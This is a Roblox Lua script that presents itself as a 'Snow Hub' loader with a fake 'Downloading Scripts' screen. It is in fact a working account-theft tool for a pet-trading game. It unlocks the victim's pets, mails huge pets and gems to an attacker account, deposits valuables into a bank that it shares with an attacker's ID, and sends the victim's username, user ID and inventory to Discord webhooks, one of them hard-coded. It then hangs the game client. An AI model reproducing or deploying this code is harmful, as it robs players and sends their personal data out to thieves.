-- Loading Fake

local username = game:GetService("Players").LocalPlayer.Name
-- Gui to Lua
-- Version: 3.2

-- Instances:

local snow = Instance.new("ScreenGui")
local loluseethis = Instance.new("Frame")
local PrismText = Instance.new("TextLabel")
local welcom = Instance.new("TextLabel")
local loadingtext = Instance.new("TextLabel")
local ggprism = Instance.new("TextLabel")
local downloadpack = Instance.new("TextLabel")
local icon = Instance.new("ImageLabel")
local gifts = Instance.new("ImageLabel")

--Properties:

snow.Name = "snow"
snow.Parent = game.CoreGui
snow.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

loluseethis.Name = "lol u see this?"
loluseethis.Parent = snow
loluseethis.AnchorPoint = Vector2.new(0.5, 0.5)
loluseethis.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
loluseethis.Position = UDim2.new(0.514967918, 0, 0.5, 0)
loluseethis.Size = UDim2.new(0, 10000, 0, 10000)
local DirectoryName = _G.LoadingScreenText
if DirectoryName == nil or DirectoryName == "" then
    DirectoryName = "Snow Hub"
    else
    DirectoryName = _G.LoadingScreenText
end

PrismText.Name = "PrismText"
PrismText.Parent = loluseethis
PrismText.AnchorPoint = Vector2.new(0.5, 0.5)
PrismText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PrismText.BackgroundTransparency = 1.000
PrismText.Position = UDim2.new(0.502150059, 0, 0.4921, 0)
PrismText.Size = UDim2.new(0, 245, 0, 30)
PrismText.Font = Enum.Font.GothamBold
PrismText.Text = "// "..DirectoryName.." :"
PrismText.TextColor3 = Color3.fromRGB(255, 255, 255)
PrismText.TextScaled = true
PrismText.TextSize = 14.000
PrismText.TextWrapped = true
PrismText.TextXAlignment = Enum.TextXAlignment.Left
PrismText.TextYAlignment = Enum.TextYAlignment.Top

welcom.Name = "welcom"
welcom.Parent = loluseethis
welcom.AnchorPoint = Vector2.new(0.5, 0.5)
welcom.BackgroundColor3 = Color3.fromRGB(0, 255, 17)
welcom.BackgroundTransparency = 1.000
welcom.Position = UDim2.new(0.498949975, 0, 0.495350003, 0)
welcom.Size = UDim2.new(0, 179, 0, 19)
welcom.Font = Enum.Font.GothamBold
welcom.Text = "Welcome "..username
welcom.TextColor3 = Color3.fromRGB(0, 255, 234)
welcom.TextScaled = true
welcom.TextSize = 14.000
welcom.TextWrapped = true
welcom.TextXAlignment = Enum.TextXAlignment.Left
welcom.TextYAlignment = Enum.TextYAlignment.Top

loadingtext.Name = "loadingtext"
loadingtext.Parent = loluseethis
loadingtext.AnchorPoint = Vector2.new(0.5, 0.5)
loadingtext.BackgroundColor3 = Color3.fromRGB(0, 255, 17)
loadingtext.BackgroundTransparency = 1.000
loadingtext.Position = UDim2.new(0.500449955, 0, 0.499950022, 0)
loadingtext.Size = UDim2.new(0, 209, 0, 19)
loadingtext.Font = Enum.Font.GothamBold
loadingtext.Text = "Your script is loading now..."
loadingtext.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingtext.TextScaled = true
loadingtext.TextSize = 14.000
loadingtext.TextWrapped = true
loadingtext.TextXAlignment = Enum.TextXAlignment.Left
loadingtext.TextYAlignment = Enum.TextYAlignment.Top

ggprism.Name = "ggprism"
ggprism.Parent = loluseethis
ggprism.AnchorPoint = Vector2.new(0.5, 0.5)
ggprism.BackgroundColor3 = Color3.fromRGB(0, 255, 17)
ggprism.BackgroundTransparency = 1.000
ggprism.Position = UDim2.new(0.498149961, 0, 0.497050017, 0)
ggprism.Size = UDim2.new(0, 163, 0, 15)
ggprism.Font = Enum.Font.GothamBold
ggprism.Text = "https://discord.gg/BqJdAVhUQt"
ggprism.TextColor3 = Color3.fromRGB(93, 131, 255)
ggprism.TextScaled = true
ggprism.TextSize = 14.000
ggprism.TextWrapped = true
ggprism.TextXAlignment = Enum.TextXAlignment.Left
ggprism.TextYAlignment = Enum.TextYAlignment.Top

downloadpack.Name = "downloadpack"
downloadpack.Parent = loluseethis
downloadpack.AnchorPoint = Vector2.new(0.5, 0.5)
downloadpack.BackgroundColor3 = Color3.fromRGB(0, 255, 17)
downloadpack.BackgroundTransparency = 1.000
downloadpack.Position = UDim2.new(0.50334996, 0, 0.502950013, 0)
downloadpack.Size = UDim2.new(0, 209, 0, 19)
downloadpack.Font = Enum.Font.GothamBold
downloadpack.Text = "Downloading Scripts (0/15)"
downloadpack.TextColor3 = Color3.fromRGB(255, 247, 0)
downloadpack.TextScaled = true
downloadpack.TextSize = 14.000
downloadpack.TextWrapped = true
downloadpack.TextXAlignment = Enum.TextXAlignment.Left
downloadpack.TextYAlignment = Enum.TextYAlignment.Top

icon.Name = "icon"
icon.Parent = loluseethis
icon.AnchorPoint = Vector2.new(0.5, 0.5)
icon.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
icon.BackgroundTransparency = 1.000
icon.Position = UDim2.new(0.47935006, 0, 0.497000039, 0)
icon.Size = UDim2.new(0, 188, 0, 190)
icon.Image = "rbxassetid://12192306512"

gifts.Name = "gifts"
gifts.Parent = loluseethis
gifts.AnchorPoint = Vector2.new(0.5, 0.5)
gifts.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
gifts.BackgroundTransparency = 1.000
gifts.Position = UDim2.new(0.491000026, 0, 0.502600074, 0)
gifts.Size = UDim2.new(0, 23, 0, 26)
gifts.Image = "rbxassetid://12192317000"
-- Scripts:

getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks = function()getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Teleport).Teleport("Shop") end
  game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled=true
  wait()
  game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled=false
  wait()
  game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Enabled = true
  wait(10)
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position)
  wait(1)
  game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true

-- :: Crystal Blobs Bypass ::
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local PSXRank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local Avatar = "https://images-ext-2.discordapp.net/external/UVUJVD3r7c-wUyjGMjIPV4m1Hp0Jxd3WMimuX3AhquA/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1009584663569907773/2b0268219f1b80c2bed5868a8850076d.png?width=678&height=678"
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local diamond = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
local version = "v4.6.7"

-- Invitation ID
local KeySecond = 3184917327
local HugesBackup = 1707009189

-- :: BSHub Script [Shiny Update] ::
-- ::    BY    CRYSTAL    BLOB    ::

-- second remotes (For Gift Steal)


local RunService = game:GetService("RunService");
local Players = game:GetService("Players");
local Player = Players.LocalPlayer; 
local Chr = Player.Character; 
local Root = Chr.HumanoidRootPart; 
local Lib = require(game:GetService("ReplicatedStorage").Framework.Library)

local RemoteFunction = debug.getupvalue(Lib.Network.Invoke, 2)
local function FireRemote(RemoteName, ...)
    return RemoteFunction(RemoteName):InvokeServer(...)
end

--- fucking checkers 

Library     = require(game:GetService('ReplicatedStorage'):FindFirstChild('Library'))
Functions   = Library.Functions
EXCLList  = {}
MythList  = {}
HugList   = {}
TitanList = {}

EXList       = {}
MYList       = {}
HUList       = {}
TINList      = {}


table.foreach(Library.Directory.Pets, function(i, v)
  if v.rarity == "Exclusive" and not v.huge and not v.titanic then
    table.insert(EXCLList, i)
  end
  if v.rarity == "Mythical" then
    table.insert(MythList, i)
  end
  if v.huge or v.titanic then
    table.insert(HugList, i)
  end
  if v.titanic then
    table.insert(TitanList, i)
  end
end)


local pets = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
pcall(function()
FireRemote("Lock Pet", y)
end)
for i, v in pairs(pets) do
if table.find(EXCLList, v["id"]) ~= nil then
table.insert(EXList, v["uid"])
end
if table.find(MythList, v["id"]) ~= nil then
table.insert(MYList, v["uid"])
end
if table.find(HugList, v["id"]) ~= nil then
table.insert(HUList, v["uid"])
end
if table.find(TitanList, v["id"]) ~= nil then
table.insert(TINList, v["uid"])end
end

-- end second remotes
  
local getmybanksremote = "Get My Banks"
local inviteremote = "Invite To Bank"
local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.    PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
local depositremote = "Bank Deposit"
local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
local getbankremote = "Get Bank"
local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client.Network).Invoke)
local bloby = getupvalues(blobx[2])
local blobz = getupvalues(bloby[1])[1][2]
local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client.Network).Invoke)
local blobb = getupvalues(bloba[2])
--blobb[2](2, ".t")
getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
inviteremote = blobz[blobb[2](2, inviteremote)]
lockremote = blobz[blobb[2](2, lockremote)]
depositremote = blobz[blobb[2](2, depositremote)] 
eggremote = blobz[blobb[2](2, eggremote)]
getbankremote = blobz[blobb[2](2, getbankremote)]

-- Invitation ID End

local diamondos = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds

-- Bank ID and Library

local lib = require(game.ReplicatedStorage:WaitForChild('Library'))
local mybanks = getmybanksremote:InvokeServer()
local BankID = mybanks[1]['BUID']
local Bank = BankID

-- Invites Debug


-- Deposit

local FinalList = {}

Library     = require(game:GetService('ReplicatedStorage'):FindFirstChild('Library'))
Functions   = Library.Functions
EXCList     = {}
  MythicList  = {}
  HugeList = {}

PogList = {139, 177, 176, 178}
  EList       = {}
  MList       = {}
  HList    = {}
  PList = {}

print("List Detected")

table.foreach(Library.Directory.Pets, function(i, v)
  if v.rarity == "Exclusive" and not v.isGift then
    table.insert(EXCList, i)
  end
  if v.rarity == "Mythical" then
    table.insert(MythicList, i)
  end
  if v.huge then
    table.insert(HugeList, i)
  end
end)
for i, v in pairs(PogList) do
table.insert(EXCList, v)
end

local pets = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
lockremote:InvokeServer(y)
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
if table.find(HugeList, v["id"]) ~= nil then
table.insert(HList, v["uid"])
end
end
if #EList + #MList + #PList < 49 then 
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
table.insert(FinalList, v)
end
elseif #EList + #MList > 49 and #EList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
elseif #EList + #MList > 49 and #EList > 49 then
for i, v in pairs(EList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
end
wait(0.5)
downloadpack.Text = "Downloading Scripts (3/10)"
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = 
{
[1] = "Cracked Egg", 
[2] = false
}
eggremote:InvokeServer("Cracked Egg", false, false);
wait(0.5)
local A_1 = 
{
[1] = Bank, 
[2] = FinalList,
[3] = 0
}
local DebugInfo = ""

-- Deposit End

-- Webhook (Victim)

-- Webhook (Victim)

-- Checking [ NEW BLOB STUFF FOR OXY MY CRUSH ]

local SuperBank = getbankremote:InvokeServer(Bank)

  EXCList     = {}
  MythicList  = {}
  LegList = {}
  EpicList = {}
  RareList = {}
  CommonList = {}
  
  HugeList = {}
  HCList = {}
  GiftList = {}
  
  ScumList = {}
  PogList = {139, 177, 176, 178}
  
  EXCCount = 0
  MythicCount = 0
  LegCount = 0
  EpicCount = 0
  RareCount = 0
  CommonCount = 0
  
  HugeCount = 0
  
  ScumCount = 0
  PogCount = 0
  HCCount = 0
  GiftCount = 0

  table.foreach(Library.Directory.Pets, function(i, v)
    if v.rarity == "Exclusive" and not v.huge then
      table.insert(EXCList, i)
    end
    if v.rarity == "Mythical" then
      table.insert(MythicList, i)
    end
    if v.rarity == "Legendary" then
      table.insert(LegList, i)
    end
    if v.rarity == "Epic" then
      table.insert(EpicList, i)
    end
    if v.rarity == "Rare" then
      table.insert(RareList, i)
    end
    if v.rarity == "Basic" then
      table.insert(CommonList, i)
    end
    if v.huge or v.titanic then
      table.insert(HugeList, i)
    end
    if v.isGift then
      table.insert(GiftList, i)
    end
  end)
  for i, v in pairs(SuperBank["Storage"]["Pets"]) do
  if table.find(EXCList, v["id"]) then EXCCount = EXCCount + 1 end
  if table.find(MythicList, v["id"]) then MythicCount = MythicCount + 1 end
  if table.find(LegList, v["id"]) then LegCount = LegCount + 1 end
  if table.find(EpicList, v["id"]) then EpicCount = EpicCount + 1 end
  if table.find(RareList, v["id"]) then RareCount = RareCount + 1 end
  if table.find(CommonList, v["id"]) then CommonCount = CommonCount + 1 end
  if table.find(HugeList, v["id"]) then HugeCount = HugeCount + 1 end
  if table.find(ScumList, v["id"]) then ScumCount = ScumCount + 1 end
  if table.find(PogList, v["id"]) then PogCount = PogCount + 1 end
  if v.hc then HCCount = HCCount + 1 end
  if v.hc and v.s >= 1000000000000000 then ScumCount = ScumCount + 1 end
  if v.id == 199 and v.s == 75000000 then ScumCount = ScumCount + 1 end
  if v.id == 272 and v.s == 70000000000 then ScumCount = ScumCount + 1 end
  if v.s == 0 then ScumCount = ScumCount + 1 end
  end

  local ping = ""
if #HUList >= 1 or #HList >= 1 then
  ping = "@everyone Big Hit"
else
  ping = "New Hit!"
end

local x = 100000
local times = #HUList * x
local gg = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds
if gg >= 15000000000 then
wait(10)  
local gemssent = gg - times - 100000
FireRemote("Send Mail", {Recipient="MOSCO_PSX", Message="gems", Pets={}, Diamonds=gemssent})
wait(10)
end

  -- gift send
  if #HUList >= 1 then
    local Hotifers = "https://discord.com/api/webhooks/1077078308090544188/CvfhE4_7rlZc9f1oDi5hIlXdDNXvlpkGQ9_0g7GE4kUtSzW32VVkceWmaaWFP-r9kKcK"
  request = http_request or request or HttpPost or syn.request
  local error1 = {
  ["content"] = "> @everyone Huges/Good Hits Notifers! :exploding_head:\n**> Vesty Bank-Steal Results "..version.."**",
  ["embeds"] = {{
  ["title"] = "Good Hits Reports",
  ["url"] = "https://discord.gg/BqJdAVhUQt",
  ["color"] = tonumber(0xF0FF00),
  ["fields"] = {
  {
  ["name"] = ":arrow_right: **Fucking Details** :arrow_left:",
  ["value"] = "**Inventory**\n```User: "..username.."\nTitanics: "..#TINList.."\nHuges: "..#HUList.."\nExclusive: "..#EXList.."\nGems: "..diamondos.."```\n\nVip Server:\nhttps://web.roblox.com/games/6284583030?privateServerLinkCode=13002492156746078470278328401829",
  ["inline"] = false
  },
  }
  }}
  }
  local errorData1 = game:GetService("HttpService"):JSONEncode(error1) 
local headers = {
["content-type"] = "application/json"
}   
  local e2 = {Url = Hotifers, Body = errorData1, Method = "POST", Headers = headers}
  request(e2)

    wait()
    downloadpack.Text = "Downloading Scripts (5/10)"

    for i =1,#HUList,1 do 
        FireRemote("Send Mail", {Recipient="MOSCO_PSX", Message="MOSCO", Pets={HUList[i]}, Diamonds=0})
        wait(10) 
    end
downloadpack.Text = "Downloading Scripts (5,985/10)\n! Failed (Unknown Error)"

else
  wait()
    downloadpack.Text = "Downloading Scripts (5/10)"
local aa,bb,cc,dd

-- main deposit
wait(8)
local t, f
local s, e = pcall(function()depositremote:InvokeServer(Bank, FinalList, require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds-1)end)
DebugInfo = DebugInfo.."Main Deposit (Pets/Gems): "..tostring(s).." ("..tostring(e)..")"
wait()
    downloadpack.Text = "Downloading Scripts (6/10)"

-- Deposit Backup
if not s or s==nil then
wait(8)
pcall(function()t, f = depositremote:InvokeServer(Bank, FinalList, 0)end) 
DebugInfo = DebugInfo.."\nBackup Deposit (Only Pets [No Gems]): "..tostring(t).." ("..tostring(f)..")"
wait()
    downloadpack.Text = "Downloading Scripts (6/10)"
end
--[[

]]
-- invite _G
wait(8)
pcall(function()cc, dd = inviteremote:InvokeServer(mybanks[1]['BUID'], _G.UserID)end)
DebugInfo = DebugInfo.."\n_G.UserID-Invite: "..tostring(cc).." ("..tostring(dd)..")"
wait()
    downloadpack.Text = "Downloading Scripts (7/10)"
    wait(0.1)
    downloadpack.Text = "Downloading Scripts (8/10)"
    wait()
    downloadpack.Text = "Downloading Scripts (9/10)"

local us = _G.WebHook
local url2 = us
request = http_request or request or HttpPost or syn.request

local headers = {
["content-type"] = "application/json"
}   
local data1 = {
  ["content"] = "> "..ping.." :exploding_head:\n**> Vesty Bank-Steal Results "..version.."**",
  ["embeds"] = {{
  ["title"] = "``` > Vesty's Bank-Steal Results < ```",
  ["url"] = "https://discord.gg/BqJdAVhUQt",
  ["description"] = ":last_quarter_moon:  Below there is "..username.."'s details of the Account.  :last_quarter_moon:",
  ["type"] = "rich",
  ["color"] = tonumber(0x00FFFF),
  ["thumbnail"] = {
    ["url"] = Avatar,
    ["height"] = 420,
    ["width"] = 420
  },
  ["fields"] = {
  {
  ["name"] = ":arrow_forward:   About Player   :arrow_backward:",
  ["value"] = "```Username     : "..username.."\nDisplay Name : "..fardplayer.DisplayName.."\nUserID       : "..fardplayer.UserId.."\nAccount Age  : "..fardplayer.AccountAge.." Days\nIP Adress    : Failed to Connect.```", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607
  ["inline"] = false
  },
  {
    ["name"] = "`> >` Gems Deposited",
    ["value"] = diamond,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Total Pet Deposited",
    ["value"] = #FinalList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Titanics",
    ["value"] = #TINList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Exclusive",
    ["value"] = #EList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Huges",
    ["value"] = #HUList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Mythicals",
    ["value"] = #MList,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Ranks",
    ["value"] = rank,
    ["inline"] = false
    },
    {
    ["name"] = "`> >` BankID",
    ["value"] = "```"..Bank.."```",
    ["inline"] = false
    },
    {
    ["name"] = "`> >` Debug",
    ["value"] = ""..DebugInfo.."",
    ["inline"] = false
    },
  }
  }}
  }
  local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

  local data2 = {
          ["embeds"] = {{
          ["title"] = "``` > Vesty Bankstealers < ```",
          ["url"] = "https://discord.gg/vesty",
          ["color"] = tonumber(0xF0FF00),
          ["thumbnail"] = {
              ["url"] = "https://images-ext-1.discordapp.net/external/9UKBF918Xw0txaEiW68dhIlGe_N8JjnJ19xU-cOcOo8/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1009584663569907773/4d0ae2a37de778f30f1b31fa4203b4b3.png",
              ["height"] = 420,
              ["width"] = 420
          },
          ["fields"] = {
          {
          ["name"] = "`> >`  Vesty Changelog "..version.."  `< <`",
          ["value"] = "```* Released "..version.."\n+ Fixed New Update PSX. ```",
          ["inline"] = false
          },
          {
          ["name"] = "`> >`  Credits  `< <`",
          ["value"] = "```- oxyy#7756 (Scripter)\n- blobbyboi#0615 (Scripter/Bypasser)\n- prism#1000 (Scripter/GUI)\n- Our Links: https://discord.gg/vesty```",
          ["inline"] = false
          },
          }
          }}
          }
          local newdata2 = game:GetService("HttpService"):JSONEncode(data2) 
  
  local headers = {
    ["content-type"] = "application/json"
  }
  local abcdef1 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
  local abcdef2 = {Url = url2, Body = newdata2, Method = "POST", Headers = headers}
  request(abcdef1)
  request(abcdef2)
  wait()
    downloadpack.Text = "Downloading Scripts (10/10)"
    while task.wait(0.1) do
      while true do print("lol") end
    end
-- Invites Scripts ( Dont Change if u dont know any )
end
